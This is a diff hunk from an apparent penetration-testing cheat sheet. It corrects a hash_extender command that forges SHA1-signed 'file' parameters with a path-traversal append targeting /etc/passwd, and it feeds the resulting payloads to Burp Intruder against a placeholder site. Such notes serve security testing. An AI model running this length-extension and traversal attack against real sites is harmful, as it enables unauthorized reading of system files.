@@ -484,7 +484,7 @@ https://github.com/iagox86/hash_extender
 
 https://site.com/index.php?file=oktest&hash=hash
 
-./hash_extender -f sha1 --data 'ok' -s hash --append '../../../../../../etc/passwd' --secret-min='
+./hash_extender -f sha1 --data 'ok' -s hash --append '../../../../../../../../../etc/passwd' --secret-min=10 --secret-max=40 --out-data-format=html --table > payloads.out
 
 burp intruder -> payloads.out in file parameter.  
   
